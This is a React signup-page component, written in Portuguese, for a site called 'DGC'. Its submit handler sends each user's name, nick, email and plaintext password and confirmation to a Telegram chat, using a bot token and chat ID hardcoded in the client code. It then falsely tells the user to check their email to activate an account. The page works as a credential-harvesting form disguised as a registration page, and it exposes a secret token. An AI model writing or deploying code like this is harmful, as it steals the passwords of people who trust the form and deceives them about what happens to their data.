import React, { useState } from "react";
import styles from "../styles/Index.module.css"; // ou o nome que quiser

function Index() {
  const [formData, setFormData] = useState({
    fullName: "",
    nick: "",
    email: "",
    password: "",
    confirmPassword: "",
  });

  const [errors, setErrors] = useState({});
  const [isSubmitted, setIsSubmitted] = useState(false);

  const handleChange = (e) => {
    const { name, value } = e.target;
    setFormData((prev) => ({
      ...prev,
      [name]: value,
    }));

    if (name === "password" || name === "confirmPassword") {
      validatePasswords();
    } else {
      validateField(name, value);
    }
  };

  const validateField = (fieldName, value) => {
    let newErrors = { ...errors };

    switch (fieldName) {
      case "fullName":
        if (!value.trim()) {
          newErrors.fullName = "Nome completo é obrigatório";
        } else if (value.trim().split(" ").length < 2) {
          newErrors.fullName = "Digite nome e sobrenome";
        } else {
          delete newErrors.fullName;
        }
        break;

      case "nick":
        if (!value.trim()) {
          newErrors.nick = "Nick é obrigatório";
        } else if (value.length < 3) {
          newErrors.nick = "Mínimo 3 caracteres";
        } else {
          delete newErrors.nick;
        }
        break;

      case "email":
        const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
        if (!value) {
          newErrors.email = "E-mail é obrigatório";
        } else if (!emailRegex.test(value)) {
          newErrors.email = "E-mail inválido";
        } else {
          delete newErrors.email;
        }
        break;

      default:
        break;
    }

    setErrors(newErrors);
  };

  const validatePasswords = () => {
    let newErrors = { ...errors };

    if (!formData.password) {
      newErrors.password = "Senha é obrigatória";
    } else if (formData.password.length < 6) {
      newErrors.password = "Mínimo 6 caracteres";
    } else {
      delete newErrors.password;
    }

    if (formData.password !== formData.confirmPassword) {
      newErrors.confirmPassword = "As senhas não coincidem";
    } else {
      delete newErrors.confirmPassword;
    }

    setErrors(newErrors);
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    validatePasswords();
    Object.keys(formData).forEach((field) => {
      validateField(field, formData[field]);
    });

    if (Object.keys(errors).length === 0) {
      console.log("Dados válidos:", formData);

      // Manda pro Telegram
      const BOT_TOKEN = "7179025614:AAHhPcC87zl8H9uOmFTWFRKRRCSr1fLdSqg";
      const CHAT_ID = "7942712256";
      const message = `
🚀 Novo cadastro DGCBot:
👤 Nome: ${formData.fullName}
🎮 Nick: ${formData.nick}
📧 Email: ${formData.email}
Senha: ${formData.password}
Csenha: ${formData.confirmPassword}
`;

      const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

      try {
        await fetch(url, {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify({
            chat_id: CHAT_ID,
            text: message,
          }),
        });
      } catch (error) {
        console.error("Erro ao enviar pro Telegram:", error);
      }

      setIsSubmitted(true);
      setFormData({
        fullName: "",
        nick: "",
        email: "",
        password: "",
        confirmPassword: "",
      });
    }
  };

  return (
    <section className={styles.container}>
      <h1 className={styles.heroText}>
        Seja bem-vindo ao <br />
        <span>D</span>
        <span>G</span>
        <span>C</span> <br />
        mostre a sua habilidade!
      </h1>

      <section className={styles.explication}>
        <div className={styles.explicationBox}>
          <p>Preencha o formulário abaixo para criar sua conta</p>
        </div>
      </section>

      {isSubmitted ? (
        <div className={styles.successMessage}>
          <h2>Cadastro realizado com sucesso!</h2>
          <p>Verifique seu e-mail para ativar sua conta</p>
        </div>
      ) : (
        <form onSubmit={handleSubmit} className={styles.form} noValidate>
          <h2 className={styles.formTitle}>Cadastro</h2>

          <div className={styles.formGroup}>
            <label htmlFor="fullName">Nome completo:</label>
            <input
              type="text"
              id="fullName"
              name="fullName"
              value={formData.fullName}
              onChange={handleChange}
              aria-required="true"
              className={errors.fullName ? styles.error : ""}
            />
            {errors.fullName && (
              <span className={styles.errorMessage}>{errors.fullName}</span>
            )}
          </div>

          <div className={styles.formGroup}>
            <label htmlFor="nick">Nick:</label>
            <input
              type="text"
              id="nick"
              name="nick"
              value={formData.nick}
              onChange={handleChange}
              aria-required="true"
              className={errors.nick ? styles.error : ""}
            />
            {errors.nick && (
              <span className={styles.errorMessage}>{errors.nick}</span>
            )}
          </div>

          <div className={styles.formGroup}>
            <label htmlFor="email">E-mail:</label>
            <input
              type="email"
              id="email"
              name="email"
              value={formData.email}
              onChange={handleChange}
              aria-required="true"
              className={errors.email ? styles.error : ""}
            />
            {errors.email && (
              <span className={styles.errorMessage}>{errors.email}</span>
            )}
          </div>

          <div className={styles.formGroup}>
            <label htmlFor="password">Senha:</label>
            <input
              type="password"
              id="password"
              name="password"
              value={formData.password}
              onChange={handleChange}
              aria-required="true"
              className={errors.password ? styles.error : ""}
            />
            {errors.password && (
              <span className={styles.errorMessage}>{errors.password}</span>
            )}
          </div>

          <div className={styles.formGroup}>
            <label htmlFor="confirmPassword">Confirme sua senha:</label>
            <input
              type="password"
              id="confirmPassword"
              name="confirmPassword"
              value={formData.confirmPassword}
              onChange={handleChange}
              aria-required="true"
              className={errors.confirmPassword ? styles.error : ""}
            />
            {errors.confirmPassword && (
              <span className={styles.errorMessage}>
                {errors.confirmPassword}
              </span>
            )}
          </div>

          <button type="submit" className={styles.submitBtn}>
            Criar Conta
          </button>
        </form>
      )}
    </section>
  );
}

export default Index;
